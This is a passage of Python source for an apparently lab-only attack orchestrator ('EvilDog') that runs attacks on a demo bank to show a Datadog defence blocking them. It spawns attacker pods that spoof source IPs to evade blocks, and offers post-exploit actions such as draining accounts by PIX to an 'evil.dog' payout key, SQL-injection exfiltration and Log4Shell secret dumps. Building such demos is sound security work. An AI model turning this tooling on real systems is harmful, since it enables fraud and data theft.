            # Contido: as contas de origem estão bloqueadas → nenhum dinheiro saiu deste IP.
            bn("TRANSFER", "contained", f"🛡️ CONTIDO — {denied} PIX negados (R$ 0,00)")
            bn("REPORT", "contained", f"contido via {ip} — auto-remediação")
            bus.publish({"type": "branch", "state": "contained", "branch": branch, "ip": ip, "level": "warn",
                         "message": f"[IP {ip}] 🛡️ CONTIDO — {denied} PIX negados (conta bloqueada), R$ 0,00 desviado"})
        else:
            bn("TRANSFER", "success", f"R$ {total:.2f} desviados" + (f" · {denied} negados" if denied else ""))
            bn("REPORT", "success", f"cadeia completa via {ip}")
            bus.publish({"type": "branch", "state": "done", "branch": branch, "ip": ip, "level": "success",
                         "message": f"[IP {ip}] concluído — R$ {total:.2f} desviado" + (f", {denied} negados" if denied else "")})
    except BlockedError as exc:
        bn(cur, "fail", "🛡️ BLOQUEADO (AAP)")
        bus.publish({"type": "branch", "state": "blocked", "branch": branch, "ip": ip, "level": "critical",
                     "message": f"[IP {ip}] BLOQUEADO — {exc}"})
    except UserBlockedError as exc:
        bn(cur, "contained", "🛡️ CONTIDO (usuário bloqueado)")
        bus.publish({"type": "branch", "state": "contained", "outcome": exc.outcome,
                     "branch": branch, "ip": ip, "level": "warn",
                     "message": f"[IP {ip}] CONTIDO — usuário bloqueado: {exc}"})
    except RateLimitedError as exc:
        bus.publish({"type": "branch", "state": "error", "outcome": exc.outcome,
                     "branch": branch, "ip": ip, "level": "warn",
                     "message": f"[IP {ip}] rate limited — {exc}"})
    except BackendError as exc:
        bus.publish({"type": "branch", "state": "error", "outcome": exc.outcome,
                     "branch": branch, "ip": ip, "level": "critical",
                     "message": f"[IP {ip}] erro de backend — {exc}"})
    except Exception as exc:
        bus.publish({"type": "branch", "state": "error", "branch": branch, "ip": ip, "level": "critical",
                     "message": f"[IP {ip}] erro: {exc}"})


# --------------------------------------------------------------------------- #
# Real escalation: ephemeral K8s Job (one attacker pod per branch)            #
# --------------------------------------------------------------------------- #
def _build_job_manifest(run_id: str, branch: int) -> dict:
    job_name = f"evildog-agent-{run_id}-{branch}"
    labels = {
        "app": "evildog-agent",
        "evildog/run-id": run_id,
        "evildog/branch": str(branch),
        "tags.datadoghq.com/env": "dogbank",
        "tags.datadoghq.com/service": "evildog-agent",
        "tags.datadoghq.com/version": os.environ.get("DD_VERSION", "dev"),
    }
    return {
        "apiVersion": "batch/v1", "kind": "Job",
        "metadata": {"name": job_name, "namespace": NAMESPACE, "labels": labels},
        "spec": {
            "backoffLimit": 0,
            "activeDeadlineSeconds": JOB_ACTIVE_DEADLINE_S,
            "ttlSecondsAfterFinished": 180,
            "completions": 1, "parallelism": 1,
            "template": {
                "metadata": {"labels": labels, "annotations": {
                    "ad.datadoghq.com/evildog-agent.logs": '[{"source":"python","service":"evildog-agent"}]',
                }},
                "spec": {
                    "restartPolicy": "Never",
                    "automountServiceAccountToken": False,
                    "containers": [{
                        "name": "evildog-agent",
                        "image": AGENT_IMAGE,
                        "imagePullPolicy": "IfNotPresent",
                        "command": ["python", "-m", "app.main"],
                        "args": ["--agent-mode"],
                        "env": [
                            {"name": "EVILDOG_AGENT_MODE", "value": "true"},
                            {"name": "EVILDOG_RUN_ID", "value": run_id},
                            {"name": "EVILDOG_BRANCH", "value": str(branch)},
                            {"name": "EVILDOG_JOB_NAME", "value": job_name},
                            {"name": "EVILDOG_ORCHESTRATOR_URL", "value": ORCHESTRATOR_URL},
                            {"name": "EVILDOG_AGENT_TOKEN", "valueFrom": {
                                "secretKeyRef": {"name": "dogbank-secrets", "key": "EVILDOG_AGENT_TOKEN"}}},
                            {"name": "EXTERNAL_TARGET", "value": "false"},
                            {"name": "AUTH_SERVICE_URL", "value": "http://auth-service:8088"},
                            {"name": "TRANSACTION_SERVICE_URL", "value": "http://transaction-service:8084"},
                            {"name": "ACCOUNT_SERVICE_URL", "value": "http://account-service:8089"},
                            {"name": "NGINX_URL", "value": "http://nginx:80"},
                            {"name": "DD_AGENT_HOST", "valueFrom": {"fieldRef": {"fieldPath": "status.hostIP"}}},
                            {"name": "DD_TRACE_AGENT_PORT", "value": "8126"},
                            {"name": "DD_ENV", "valueFrom": {"fieldRef": {
                                "fieldPath": "metadata.labels['tags.datadoghq.com/env']"}}},
                            {"name": "DD_SERVICE", "valueFrom": {"fieldRef": {
                                "fieldPath": "metadata.labels['tags.datadoghq.com/service']"}}},
                            {"name": "DD_VERSION", "valueFrom": {"fieldRef": {
                                "fieldPath": "metadata.labels['tags.datadoghq.com/version']"}}},
                            {"name": "DD_LOGS_INJECTION", "value": "true"},
                            {"name": "POD_IP", "valueFrom": {"fieldRef": {"fieldPath": "status.podIP"}}},
                        ],
                        "resources": {
                            "requests": {"memory": "128Mi", "cpu": "75m"},
                            "limits": {"memory": "384Mi", "cpu": "500m"},
                        },
                    }],
                },
            },
        },
    }


def _pod_phase_for(pod) -> str:
    if pod.metadata.deletion_timestamp is not None:
        return "Terminating"
    phase = pod.status.phase
    if phase == "Pending":
        for s in (pod.status.container_statuses or []):
            if s.state and s.state.waiting and s.state.waiting.reason in ("ContainerCreating", "PodInitializing"):
                return "ContainerCreating"
        return "Pending"
    return phase or "Pending"


def _active_agent_count() -> int:
    return sum(1 for a in API_STATE["agents"].values()
               if a.get("phase") not in ("Succeeded", "Failed", "Deleted"))


AGENT_RETENTION_S = int(os.getenv("EVILDOG_AGENT_RETENTION_S", "900"))
MAX_AGENT_HISTORY = int(os.getenv("EVILDOG_MAX_AGENT_HISTORY", "100"))


def _mark_agent_terminal(job_name: str, phase: str = "Deleted") -> None:
    agent = API_STATE["agents"].setdefault(job_name, {})
    agent["phase"] = phase
    agent["finished_at"] = _now()
    agent["_finished_monotonic"] = time.monotonic()


def _prune_agents() -> int:
    """Mantém histórico curto para o painel sem deixar o estado em memória crescer.

    Não remove agentes ativos e mantém os terminados por alguns minutos para que uma
    reconexão SSE ainda consiga mostrar a rodada recém-concluída.
    """
    now = time.monotonic()
    terminal = [(name, data) for name, data in API_STATE["agents"].items()
                if data.get("phase") in ("Succeeded", "Failed", "Deleted")]
    doomed = [name for name, data in terminal
              if now - data.get("_finished_monotonic", now) > AGENT_RETENTION_S]
    remaining = [(name, data) for name, data in terminal if name not in doomed]
    overflow = max(0, len(remaining) - MAX_AGENT_HISTORY)
    if overflow:
        remaining.sort(key=lambda item: item[1].get("_finished_monotonic", 0))
        doomed.extend(name for name, _ in remaining[:overflow])
    for name in set(doomed):
        API_STATE["agents"].pop(name, None)
    return len(set(doomed))


# --------------------------------------------------------------------------- #
# Escalação no stack local (docker-compose/podman): mesma imagem, mesmo        #
# --agent-mode, mesmo contrato de eventos SSE do backend k8s -- o que muda é   #
# o objeto criado (container efêmero em vez de Job). Cada agente rotaciona seu #
# próprio X-Forwarded-For no import (rotate_source_ip), então cada um chega na #
# AAP como um IP de origem distinto, igual aos pods.                           #
# --------------------------------------------------------------------------- #
def _agent_env(run_id: str, branch: int, job_name: str) -> dict:
    """Env do processo agente. Herda do orquestrador os alvos/config de APM para os
    agentes atacarem exatamente o mesmo alvo, sem redefinir defaults em dois lugares."""
    passthrough = ("AUTH_SERVICE_URL", "TRANSACTION_SERVICE_URL", "ACCOUNT_SERVICE_URL",
                   "CHATBOT_SERVICE_URL", "NGINX_URL", "PUBLIC_BASE_URL", "EVILDOG_TARGET_LABEL",
                   "EXTERNAL_TARGET", "EVILDOG_ATTACK_DIRECT", "EVILDOG_ALLOWED_TARGET_HOSTS",
                   "LOG4J_CALLBACK_HOST", "LOG4J_CALLBACK_LDAP_PORT", "LOG4J_CALLBACK_HTTP_PORT",
                   "LOG4J_EXFIL_ENV", "DD_AGENT_HOST", "DD_TRACE_AGENT_PORT", "DD_ENV")
    env = {k: os.environ[k] for k in passthrough if os.environ.get(k)}
    env.update({
        "EVILDOG_AGENT_MODE": "true",
        "EVILDOG_RUN_ID": run_id,
        "EVILDOG_BRANCH": str(branch),
        "EVILDOG_JOB_NAME": job_name,
        "EVILDOG_ORCHESTRATOR_URL": ORCHESTRATOR_URL,
        "EVILDOG_AGENT_TOKEN": AGENT_TOKEN or "",
        # serviço próprio: separa o tráfego dos agentes do orquestrador no APM
        "DD_SERVICE": "evildog-agent",
        "DD_VERSION": os.getenv("DD_VERSION", "dev"),
        "DD_LOGS_INJECTION": "true",
    })
    return env


def _docker_container_phase(container) -> str:
    """Traduz status do runtime para as mesmas fases que a UI já entende (pod_phase)."""
    try:
        container.reload()
    except Exception:
        return "Deleted"
    status = (container.status or "").lower()
    if status in ("created", "configured"):
        return "ContainerCreating"
    if status in ("running", "paused"):
        return "Running"
    if status in ("exited", "stopped", "died"):
        code = (container.attrs.get("State") or {}).get("ExitCode", 1)
        return "Succeeded" if code == 0 else "Failed"
    return "Pending"


def _spawn_docker_agent(run_id: str, branch: int) -> str:
    """Cria um container agente efêmero. Retorna o nome (job_name equivalente)."""
    job_name = f"evildog-agent-{run_id}-{branch}"
    _docker_client.containers.run(
        AGENT_IMAGE,
        command=["python", "-m", "app.main", "--agent-mode"],
        name=job_name,
        environment=_agent_env(run_id, branch, job_name),
        network=DOCKER_NETWORK,
        detach=True,
        remove=False,          # removido pelo watcher, depois de ler a fase final
        labels={
            "app": "evildog-agent",
            "evildog/run-id": run_id,
            "evildog/branch": str(branch),
            "com.datadoghq.ad.logs": '[{"source":"python","service":"evildog-agent"}]',
            "com.datadoghq.tags.env": os.getenv("DD_ENV", "dogbank"),
            "com.datadoghq.tags.service": "evildog-agent",
        },
    )
    return job_name


async def _watch_docker_run(run_id: str, job_names: list, failed_creations: int = 0) -> None:
    """Equivalente local de _watch_run: publica pod_phase/pod_deleted/swarm_done."""
    loop = asyncio.get_running_loop()
    deadline = time.monotonic() + JOB_ACTIVE_DEADLINE_S + 20
    pending = set(job_names)
    last_phase = {}
    try:
        while pending and time.monotonic() < deadline:
            await asyncio.sleep(2)
            for job_name in list(pending):
                try:
                    container = await loop.run_in_executor(
                        None, lambda n=job_name: _docker_client.containers.get(n))
                except Exception:
                    continue
                phase = await loop.run_in_executor(
                    None, lambda c=container: _docker_container_phase(c))
                if phase != last_phase.get(job_name):
                    last_phase[job_name] = phase
                    API_STATE["agents"].setdefault(job_name, {})["phase"] = phase
                    bus.publish({"type": "pod_phase", "pod": job_name, "phase": phase,
                                 "level": "info", "message": f"[POD] {job_name} -> {phase}"})
                if phase in ("Succeeded", "Failed"):
                    pending.discard(job_name)
                    await loop.run_in_executor(None, lambda c=container: _remove_container(c))
                    _mark_agent_terminal(job_name)
                    bus.publish({"type": "pod_deleted", "pod": job_name, "run_id": run_id,
                                 "message": f"[POD] {job_name} removido"})
        if pending:
            for job_name in pending:
                try:
                    c = await loop.run_in_executor(
                        None, lambda n=job_name: _docker_client.containers.get(n))
                    await loop.run_in_executor(None, lambda c=c: _remove_container(c, force=True))
                except Exception:
                    pass
                _mark_agent_terminal(job_name)
            bus.publish({"type": "swarm_done", "state": "timeout", "run_id": run_id, "level": "warn",
                         "message": f"[ESCALACAO] {len(pending)} agente(s) excederam o prazo"})
        else:
            summary = _swarm_completion(job_names, last_phase, failed_creations)
            bus.publish({"type": "swarm_done", "run_id": run_id,
                         "failed_creations": failed_creations, **summary})
        _prune_agents()
    except Exception as exc:
        logger.exception(f"[EvilDog] _watch_docker_run crashed: {exc}")
        bus.publish({"type": "swarm_done", "state": "error", "run_id": run_id, "level": "critical",
                     "message": f"[ESCALACAO] erro interno no watcher: {exc}"})


def _remove_container(container, force: bool = False) -> None:
    try:
        container.remove(force=force)
    except Exception:
        pass


def _swarm_completion(job_names: list, last_phase: dict, failed_creations: int = 0) -> dict:
    """Resumo semântico da rodada: defesa conteve o ataque => robô falhou."""
    failed_agents = sum(
        1 for name in job_names
        if last_phase.get(name) == "Failed"
        or API_STATE["agents"].get(name, {}).get("outcome") in ("blocked", "contained", "error")
    )
    total = len(job_names) + failed_creations
    failed_total = failed_agents + failed_creations
    if total and failed_total == total:
        return {
            "state": "failed", "level": "critical", "failed_agents": failed_total,
            "message": f"[ESCALACAO] enxame contido — {failed_total}/{total} agente(s) falharam",
        }
    if failed_total:
        return {
            "state": "partial", "level": "warn", "failed_agents": failed_total,
            "message": f"[ESCALACAO] rodada parcial — {failed_total}/{total} agente(s) falharam",
        }
    return {
        "state": "done", "level": "success", "failed_agents": 0,
        "message": "[ESCALACAO] rodada distribuida concluida",
    }


# --------------------------------------------------------------------------- #
# FastAPI app                                                                 #
# --------------------------------------------------------------------------- #
@asynccontextmanager
async def lifespan(app: FastAPI):
    bus.bind_loop(asyncio.get_running_loop())
    _init_k8s_client()
    if not _K8S_READY:
        _init_docker_client()
    handler = SSELogHandler()
    handler.setLevel(logging.INFO)
    logging.getLogger("security_attacker").addHandler(handler)
    logger.info("🐕‍🦺 evildog-api up — attack orchestrator ready (lab only)")
    bus.publish({"level": "info", "message": "[SYSTEM] EvilDog online — alvo carregado"})
    yield


app = FastAPI(title="EvilDog API", description="DogBank attack orchestrator (lab only)",
              version="1.0.0", lifespan=lifespan)
app.add_middleware(
    # Cookies de sessão exigem origens explícitas (o navegador rejeita wildcard +
    # credentials). Configure EVILDOG_CORS_ORIGINS para um hostname adicional.
    CORSMiddleware, allow_origins=CORS_ORIGINS, allow_credentials=True,
    allow_methods=["*"], allow_headers=["*"],
)


def _prune_control_sessions() -> None:
    now = time.monotonic()
    for session_id, expiry in list(_CONTROL_SESSIONS.items()):
        if expiry <= now:
            _CONTROL_SESSIONS.pop(session_id, None)


def _control_session_valid(request: Request) -> bool:
    if ALLOW_UNAUTHENTICATED:
        return True
    session_id = request.cookies.get(CONTROL_COOKIE)
    if not session_id:
        return False
    _prune_control_sessions()
    return _CONTROL_SESSIONS.get(session_id, 0) > time.monotonic()


@app.middleware("http")
async def evildog_control_gate(request: Request, call_next):
    """Require an operator session for every control/read endpoint.

    The agent callback has an independent Bearer token and must remain reachable
    from ephemeral containers.  Health/session endpoints are deliberately small
    exceptions; unauthenticated mode is an explicit local-lab opt-in only.
    """
    path = request.url.path
    public = {
        "/api/evildog/health",
        "/api/evildog/session",
        "/api/evildog/logout",
        "/api/evildog/agent-events",
    }
    if not path.startswith("/api/evildog/") or path in public or request.method == "OPTIONS":
        return await call_next(request)
    if ALLOW_UNAUTHENTICATED:
        return await call_next(request)
    if not CONTROL_TOKEN:
        return JSONResponse(status_code=503, content={
            "error": "control_token_not_configured",
            "detail": "EVILDOG_CONTROL_TOKEN é obrigatório para controlar o EvilDog.",
        })
    if not _control_session_valid(request):
        return JSONResponse(status_code=401, content={
            "error": "control_session_required",
            "detail": "Abra uma sessão de operador em /api/evildog/session.",
        })
    return await call_next(request)


class ControlSessionBody(BaseModel):
    token: Optional[str] = None


@app.post("/api/evildog/session")
async def create_control_session(body: ControlSessionBody = Body(default=ControlSessionBody())):
    if ALLOW_UNAUTHENTICATED:
        return {"ok": True, "mode": "explicit_local_unauthenticated"}
    if not CONTROL_TOKEN:
        return JSONResponse(status_code=503, content={
            "error": "control_token_not_configured",
            "detail": "Configure EVILDOG_CONTROL_TOKEN; controles públicos são desabilitados por padrão.",
        })
    if not body.token or not hmac.compare_digest(body.token, CONTROL_TOKEN):
        return JSONResponse(status_code=403, content={"error": "invalid_control_token"})
    _prune_control_sessions()
    session_id = secrets.token_urlsafe(32)
    _CONTROL_SESSIONS[session_id] = time.monotonic() + CONTROL_SESSION_TTL_S
    response = JSONResponse(content={"ok": True, "expires_in_s": CONTROL_SESSION_TTL_S})
    response.set_cookie(
        CONTROL_COOKIE,
        session_id,
        max_age=CONTROL_SESSION_TTL_S,
        httponly=True,
        secure=True,
        samesite="strict",
        path="/api/evildog",
    )
    return response


@app.post("/api/evildog/logout")
async def logout_control_session(request: Request):
    session_id = request.cookies.get(CONTROL_COOKIE)
    if session_id:
        _CONTROL_SESSIONS.pop(session_id, None)
    response = JSONResponse(content={"ok": True})
    response.delete_cookie(CONTROL_COOKIE, path="/api/evildog", secure=True, httponly=True, samesite="strict")
    return response


class AttackRequest(BaseModel):
    payload: Optional[str] = None


@app.get("/api/evildog/health")
async def health():
    return {"status": "ok", "service": "evildog-api",
            "telemetry": {"last_seq": bus.seq, "dropped_events": bus.dropped_events}}


@app.get("/api/evildog/vectors")
async def vectors():
    return {"vectors": VECTORS}


@app.get("/api/evildog/stats")
async def stats():
    return {"cards": _cards(), "raw": attacker.stats,
            "records_leaked_total": API_STATE["records_leaked_total"],
            "secrets": API_STATE["secrets"],
            "telemetry": {"last_seq": bus.seq, "dropped_events": bus.dropped_events}}


@app.post("/api/evildog/reset")
async def reset_demo_state():
    """Prepara um novo take, limpando o EvilDog e a contenção da aplicação.

    O workflow bloqueia de propósito todo o segmento sem MFA e esse estado vive
    no PostgreSQL, não no navegador. Limpar apenas os cards do EvilDog deixava o
    PIX e o ATO quebrados na execução seguinte. O token administrativo permanece
    exclusivamente neste backend; ele nunca é devolvido ao browser.
    """
    if _pipeline_active() or _active_agent_count() > 0:
        return JSONResponse(status_code=409, content={
            "error": "demo_active",
            "detail": "Não é seguro limpar estado com pipeline ou agentes ativos.",
            "pipeline": _pipeline_snapshot(),
            "active_agents": _active_agent_count(),
        })

    remediation = {"status": "skipped", "count": 0}
    if ADMIN_BLOCK_TOKEN:
        try:
            response = await asyncio.to_thread(
                requests.post,
                f"{AUTH_SERVICE_URL.rstrip('/')}/api/auth/admin/unblock-no-mfa",
                headers={"X-Admin-Token": ADMIN_BLOCK_TOKEN},
                timeout=15,
            )
            if not response.ok:
                return JSONResponse(status_code=502, content={
                    "error": "demo_reset_failed",
                    "detail": f"auth-service recusou o reset dos usuários (HTTP {response.status_code})",
                })
            payload = response.json() if response.content else {}
            remediation = {
                "status": payload.get("status", "unblocked"),
                "count": int(payload.get("count", 0)),
            }
        except (requests.RequestException, ValueError, TypeError) as exc:
            logger.exception("[EvilDog] falha ao desbloquear usuários para novo take")
            return JSONResponse(status_code=502, content={
                "error": "demo_reset_failed",
                "detail": f"não foi possível preparar os usuários: {exc}",
            })
    else:
        logger.warning("[EvilDog] ADMIN_BLOCK_TOKEN ausente; reset não alterou usuários bloqueados")

    API_STATE["findings"] = 0
    API_STATE["compromised"].clear()
    API_STATE["records_leaked_total"] = 0
    API_STATE["secrets"].clear()
    API_STATE["loot_records"].clear()
    API_STATE["pix_stolen"].clear()
    API_STATE["last_pipeline"] = {}
    API_STATE["agents"].clear()
    API_STATE["last_escalate_at"] = 0.0
    API_STATE["pipeline"].update({
        "run_id": None,
        "status": "idle",
        "source_ip": None,
        "outcome": None,
        "detail": None,
        "started_at": None,
        "finished_at": None,
    })
    for key in attacker.stats:
        attacker.stats[key] = 0
    attacker.valid_token = None
    attacker.compromised_account_id = None
    # Novo Take is the boundary between demo stories.  Preserve the current IP
    # when it is usable, but never let an unexpired denylist entry make Act 1
    # start already blocked. This also survives browser refreshes because the
    # decision is made against the instrumented service, not local storage.
    readiness = await asyncio.to_thread(_ensure_available_source_ip)
    # A fresh tab must not receive the previous take as replay telemetry. Keep
    # the global sequence monotonic, but start a new bounded history window.
    bus.recent.clear()
    if readiness["status"] == "ready" and readiness["rotated"]:
        bus.publish({
            "type": "system",
            "level": "info",
            "message": f"[PREFLIGHT] IP anterior ainda bloqueado; novo IP validado: {readiness['source_ip']}",
        })
    elif readiness["status"] == "ready":
        bus.publish({"type": "system", "level": "info", "message": "[PREFLIGHT] estado limpo e IP de origem validado"})
    else:
        bus.publish({
            "type": "system",
            "level": "warn",
            "message": f"[PREFLIGHT] estado limpo; IP não validado ({readiness.get('detail', readiness['status'])})",
        })
    return {
        "ok": True,
        "source_ip": _source_ip(),
        "pipeline": _pipeline_snapshot(),
        "remediation": remediation,
        "readiness": readiness,
    }


@app.post("/api/evildog/rotate-ip")
async def rotate_ip():
    if _pipeline_active():
        # Não deixe uma aba/refresh alterar silenciosamente a identidade de uma
        # demonstração que já está em curso. A UI pode exibir o run e tentar de novo
        # após o evento terminal.
        return JSONResponse(status_code=409, content={
            "error": "pipeline_active",
            "detail": "Não é permitido rotacionar o IP durante um pipeline ativo.",
            "pipeline": _pipeline_snapshot(),
        })
    ip = rotate_source_ip()
    bus.publish({"level": "warn", "node": "RECON",
                 "message": f"[EVASÃO] IP de origem rotacionado → {ip} (novo X-Forwarded-For) — "
                            f"o bloqueio anterior não se aplica mais"})
    return {"ok": True, "source_ip": ip}


@app.get("/api/evildog/source-ip")
async def source_ip():
    return {"source_ip": _source_ip()}


@app.get("/api/evildog/target")
async def target():
    host = _urlparse(_base()).hostname or TARGET_LABEL
    return {
        "address": host,
        "base_url": _base(),
        "source_ip": _source_ip(),
        "external_origin": bool(_SPOOF["ip"]) or os.getenv("EXTERNAL_TARGET", "false").lower() == "true",
        "os": "Debian Linux (container) · EKS",
        "services": ["Spring Boot (auth/tx/account)", "PostgreSQL", "Nginx", "Chatbot (FastAPI)"],
        "open_ports": [
            {"port": 8088, "service": "auth"},
            {"port": 8084, "service": "transaction"},
            {"port": 8089, "service": "account"},
            {"port": 5432, "service": "postgres"},
            {"port": 443, "service": "https"},
        ],
        "cvss": 9.8,
        "severity": "CRITICAL",
    }


@app.get("/api/evildog/loot")
async def loot():
    rows = API_STATE["loot_records"]
    total = sum(_parse_money(r.get("saldo")) for r in rows)
    pix_total = sum(float(p.get("amount", 0) or 0) for p in API_STATE["pix_stolen"])
    return {
        "records": rows,
        "secrets": API_STATE["secrets"],
        "pix_stolen": API_STATE["pix_stolen"],
        "summary": {
            "records": len(rows),
            "secrets": len(API_STATE["secrets"]),
            "accounts_value": round(total, 2),
            "pix_stolen_total": round(pix_total, 2),
        },
    }


@app.get("/api/evildog/scan")
async def scan():
    host = _urlparse(_base()).hostname or TARGET_LABEL
    return {
        "target": host,
        "opportunities": SCAN_OPPORTUNITIES,
        "open_ports": [
            {"port": 8088, "service": "auth"}, {"port": 8084, "service": "transaction"},
            {"port": 8089, "service": "account"}, {"port": 5432, "service": "postgres"},
            {"port": 443, "service": "https"}, {"port": 1389, "service": "ldap (callback)"},
        ],
        "attack_surface": len(VECTORS),
    }


@app.get("/api/evildog/vulnerabilities")
async def vulnerabilities():
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    vulns = sorted(VECTORS, key=lambda v: order.get(v["severity"], 9))
    counts = {}
    for v in vulns:
        counts[v["severity"]] = counts.get(v["severity"], 0) + 1
    return {"vulnerabilities": vulns, "total": len(vulns), "by_severity": counts}


@app.get("/api/evildog/report")
async def report():
    users = API_STATE["loot_records"]
    total_value = sum(_parse_money(r.get("saldo")) for r in users)
    pix_total = sum(float(p.get("amount", 0) or 0) for p in API_STATE["pix_stolen"])
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    vulns = sorted(VECTORS, key=lambda v: order.get(v["severity"], 9))
    return {
        "target": _urlparse(_base()).hostname or TARGET_LABEL,
        "generated": True,
        "summary": {
            "users_compromised": len(users),
            "accounts_value": round(total_value, 2),
            "passwords_leaked": sum(1 for u in users if u.get("senha")),
            "secrets_leaked": len(API_STATE["secrets"]),
            "pix_stolen_total": round(pix_total, 2),
            "systems_compromised": len(API_STATE["compromised"]),
            "vulnerabilities": len(vulns),
            "critical": sum(1 for v in vulns if v["severity"] == "critical"),
        },
        "users": users,
        "secrets": API_STATE["secrets"],
        "pix_stolen": API_STATE["pix_stolen"],
        "systems": sorted(API_STATE["compromised"]),
        "vulnerabilities": vulns,
        "case_study": SALAMI_CASES,
    }


@app.get("/api/evildog/postexploit")
async def postexploit_list():
    return {"actions": POSTEXPLOIT_ACTIONS}


class PostExploitBody(BaseModel):
    amount: Optional[float] = None
    pix_key: Optional[str] = None


@app.post("/api/evildog/postexploit/{action}")
async def postexploit(action: str, body: PostExploitBody = Body(default=PostExploitBody())):
    loop = asyncio.get_running_loop()
    try:
        return await _postexploit_dispatch(action, body, loop)
    except BlockedError as exc:
        # A AAP barrou a ação. Sem este tratamento a BlockedError subia como 500 e a UI
        # mostrava "erro" em vez do bloqueio -- que é justamente o que a demo quer provar.
        src = _source_ip()
        attacker.stats["blocked"] += 1
        bus.publish({"type": "pipeline", "state": "blocked", "level": "critical",
                     "message": f"🛡️ AÇÃO BLOQUEADA — a Datadog (AAP) barrou {action} do IP {src}. {exc}"})
        return JSONResponse(status_code=200, content={
            "ok": False, "blocked": True, "action": action, "source_ip": src,
            "detail": str(exc), "cards": _cards()})


async def _postexploit_dispatch(action: str, body: PostExploitBody, loop):
    async with _attack_lock:
        if action == "drain-all":
            res = await loop.run_in_executor(None, _postexploit_drain_all, body.amount or 1.0)
        elif action == "pix":
            res = await loop.run_in_executor(None, _postexploit_pix,
                                             body.amount or 9990.0, body.pix_key or "attacker.payout@evil.dog")
        elif action == "drain":
            res = await loop.run_in_executor(None, _postexploit_pix,
                                             body.amount or 999999.0, body.pix_key or "attacker.payout@evil.dog")
        elif action == "export-data":
            res = await loop.run_in_executor(None, _run_sqli_exfil)
        elif action == "dump-secrets":
            if not API_STATE["secrets"]:
                await loop.run_in_executor(None, _run_log4shell_exfil)
            res = {"ok": bool(API_STATE["secrets"]), "secrets": API_STATE["secrets"]}
        else:
            return JSONResponse(status_code=404, content={"error": f"unknown action '{action}'"})
    res["cards"] = _cards()
    return res


class TargetBody(BaseModel):
    target: str


@app.get("/api/evildog/config")
async def get_config():
    return {"target": _base(), "targets": STATE_TARGET["targets"],
            "external_origin": os.getenv("EXTERNAL_TARGET", "false").lower() == "true",
            "allow_any": ALLOW_ANY_TARGET}


@app.post("/api/evildog/config/target")
async def set_target(body: TargetBody):
    norm = _normalize_target(body.target)
    if not _target_allowed(norm):
        return JSONResponse(status_code=403, content={
            "error": f"target fora do escopo permitido: {norm}",
            "hint": "Endpoint público sem auth: só alvos do lab. Adicione o host em "
                    "EVILDOG_ALLOWED_TARGETS (ou EVILDOG_ALLOW_ANY_TARGET=1).",
        })
    STATE_TARGET["base"] = norm
    if norm not in STATE_TARGET["targets"]:
        STATE_TARGET["targets"].append(norm)
    bus.publish({"level": "info", "message": f"[SYSTEM] target definido: {norm}"})
    return {"ok": True, "target": norm, "targets": STATE_TARGET["targets"]}


@app.post("/api/evildog/attack/{vector}")
async def attack(vector: str, body: AttackRequest = Body(default=AttackRequest())):
    if vector not in VECTOR_IDS:
        return JSONResponse(status_code=404, content={"error": f"unknown vector '{vector}'"})
    vmeta = next(v for v in VECTORS if v["id"] == vector)
    bus.publish({"level": "info", "node": vmeta["node"],
                 "message": f"[{vmeta['label'].upper()}] iniciando ({vmeta['cwe']})…"})
    async with _attack_lock:
        result = await asyncio.get_running_loop().run_in_executor(None, _run_vector, vector)
    result["cards"] = _cards()
    return result


@app.post("/api/evildog/pipeline/run")
async def pipeline_run():
    if _pipeline_active():
        return JSONResponse(status_code=409, content={
            "error": "pipeline_active",
            "detail": "Já existe um pipeline principal em execução.",
            "pipeline": _pipeline_snapshot(),
        })
    run_id = f"run-{uuid.uuid4().hex[:8]}"
    source_ip = _source_ip()
    previous = _pipeline_snapshot()
    verify_enforcement = _should_verify_aap_enforcement(previous, source_ip)
    _start_pipeline_state(run_id, source_ip)

    async def _bg():
        async with _attack_lock:
            await asyncio.get_running_loop().run_in_executor(
                None, _run_pipeline, run_id, source_ip, verify_enforcement,
            )

    asyncio.create_task(_bg())
    return {"run_id": run_id, "status": "started", "source_ip": source_ip,
            "nodes": PIPELINE_NODES}


class AgentEvent(BaseModel):
    run_id: str
    branch: int
    job_name: str
    ip: Optional[str] = None
    type: Optional[str] = "log"
    level: Optional[str] = None
    node: Optional[str] = None
    state: Optional[str] = None
    message: Optional[str] = None


@app.post("/api/evildog/agent-events")
async def agent_events(ev: AgentEvent, authorization: str = Header(default="")):
    if not AGENT_TOKEN or authorization != f"Bearer {AGENT_TOKEN}":
        return JSONResponse(status_code=401, content={"error": "unauthorized"})
    if ev.job_name not in API_STATE["agents"]:
        return JSONResponse(status_code=403, content={"error": "unknown_job"})
    if API_STATE["agents"][ev.job_name].get("run_id") != ev.run_id:
        return JSONResponse(status_code=403, content={"error": "run_mismatch"})
    pod_name = ev.job_name
    if ev.type == "node":
        if ev.ip:
            API_STATE["agents"][ev.job_name]["ip"] = ev.ip
        # O `ip` PRECISA ir no evento publicado: o painel lê agent.ip de pod_node e sem
        # este campo o card do agente mostrava "—", perdendo a prova visual de que cada
        # agente ataca de um IP de origem distinto (o ponto central da escalação).
        bus.publish({"type": "pod_node", "pod": pod_name, "run_id": ev.run_id,
                     "node": ev.node, "state": ev.state,
                     "ip": ev.ip or API_STATE["agents"][ev.job_name].get("ip"),
                     "level": ev.level, "message": ev.message})
    elif ev.type == "pipeline":
        outcome = {"blocked": "blocked", "done": "done", "error": "error"}.get(ev.state, ev.state)
        API_STATE["agents"][ev.job_name]["outcome"] = outcome
        bus.publish({"type": "pod_outcome", "pod": pod_name, "run_id": ev.run_id, "outcome": outcome,
                     "level": ev.level, "message": ev.message})
    else:
        bus.publish({"type": "log", "level": ev.level, "node": ev.node, "message": ev.message,
                     "pod": pod_name, "run_id": ev.run_id})
    return {"ok": True}


@app.post("/api/evildog/escalate")
async def escalate(count: int = 5):
    """Escalação após bloqueio: dispara N agentes REAIS (K8s Jobs), cada um com IP de
    origem spoofado distinto, rodando a cadeia completa de ataque de forma independente."""
    # A autorização é feita pelo middleware de sessão HttpOnly.  O antigo
    # X-Admin-Token pode continuar chegando de UIs antigas, mas é ignorado: não
    # existe mais segredo administrativo recuperável no bundle do navegador.
    if not _K8S_READY and not _DOCKER_READY:
        bus.publish({"type": "swarm_start", "state": "error", "level": "critical",
                     "message": "[ESCALACAO] orquestracao de agentes indisponivel (sem k8s nem docker)"})
        return JSONResponse(status_code=503, content={"error": "orchestration_unavailable"})

    _prune_agents()
    now = time.monotonic()
